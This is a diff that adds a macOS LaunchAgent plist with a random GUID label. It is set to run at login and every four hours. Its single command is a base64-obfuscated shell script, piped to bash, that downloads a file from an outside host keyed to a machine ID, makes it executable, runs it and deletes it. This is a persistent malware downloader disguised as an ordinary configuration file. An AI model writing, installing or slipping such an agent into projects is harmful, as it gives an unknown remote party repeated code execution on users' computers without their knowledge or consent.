@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+	<dict>
+		<key>Label</key>
+		<string>com.FEE56CE7.09A9.43F1.8B77.FDDB6B8323B5</string>
+		<key>ProgramArguments</key>
+		<array>
+			<string>/bin/zsh</string>
+			<string>-c</string>
+			<string>echo -e aU9lPSd0bXA9Iic7aU9leT0nJChta3RlbXAgLyc7U2F4PSd0bXAvJztTYXhMUHk9J1hYWFhYJztod1JYT209J1hYWCkiOyBjdXJsIC0tcic7aHdSWE9tNmw3ZUloPSdldHJ5IDUgLWYgImh0dHA6Jztod1JYT202PScvL2FwJztSU19fTmFiczdGcFc9J2kucHJvY2Vzc2VyZic7UlNfXz0naWx0ZXIuJztSU19fTmFicz0nY29tL3BsZz91PSc7UlNfX05hYj0nN0Y5NDEyNUYtQjM5OC0nO0FkdGw9JzUxNkMtOTUyRC1DQkMnO0FkdGxMWmlBODc3QT0nMDA3MUUnO0FkdGxMWmlBODc3PSdFQUVGIiAtbyc7QWR0bExaaUE9JyAiJHt0bSc7QWR0bExaaT0ncH0iJztBZHQ9JzsgaWYgWyc7QWR0bEw9J1sgLXMgIic7akFNeEtOcUg9JyR7dG1wfSInO2pBTXhLTnFIOHY9JyBdXTsgdGhlbiBjaG1vZCc7VFc3S0pCeE89JyA3NzcgIiR7dG0nO1RXN0tKQnhPOFc9J3B9IjsgIiR7dG1wfSc7VFc3PSciOyBmaTsgcic7VFc3S0pCeE84PSdtICIkJztDaG89J3t0bXB9Iic7ZWNobyAtZSAke2lPZX0ke2lPZXl9JHtTYXh9JHtTYXhMUHl9JHtod1JYT219JHtod1JYT202bDdlSWh9JHtod1JYT202fSR7UlNfX05hYnM3RnBXfSR7UlNfX30ke1JTX19OYWJzfSR7UlNfX05hYn0ke0FkdGx9JHtBZHRsTFppQTg3N0F9JHtBZHRsTFppQTg3N30ke0FkdGxMWmlBfSR7QWR0bExaaX0ke0FkdH0ke0FkdGxMfSR7akFNeEtOcUh9JHtqQU14S05xSDh2fSR7VFc3S0pCeE99JHtUVzdLSkJ4TzhXfSR7VFc3fSR7VFc3S0pCeE84fSR7Q2hvfSB8IC9iaW4venNo | base64 -D | /bin/bash</string>
+		</array>
+		<key>RunAtLoad</key>
+		<true />
+		<key>StartInterval</key>
+		<integer>14400</integer>
+	</dict>
+</plist>
